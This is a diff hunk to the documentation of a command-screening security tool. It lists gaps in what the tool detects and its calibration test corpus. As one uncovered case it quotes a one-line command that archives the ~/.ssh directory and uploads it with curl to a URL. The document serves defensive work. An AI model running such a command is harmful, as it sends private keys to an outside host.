@@ -235,7 +235,9 @@ as a tested, ready-to-integrate building block.
   approval is fail-closed, never fail-open); interpreter payloads stay opaque
   (flagged `medium` by default, `high` when they contain destructive/network
   tokens); `--eval` long forms are not covered; file-mediated upload across
-  `;` (`tar czf t.tgz ~/.ssh; curl -F file=@t.tgz URL`) is not covered.
+  `;` (`tar czf t.tgz ~/.ssh; curl -F file=@t.tgz URL`) is not covered; a URL
+  whose instruction sits 80+ characters away on the same line keeps a bounded
+  window (anti-false-positive, the adjacent-line context still applies).
 - **The calibration corpus is the permanent gate** (`security/fixtures/`,
   75 Markdown files + `expected.json`, including an intentional
   `false-positives/` set): any scoring change must keep it green — benign ≤
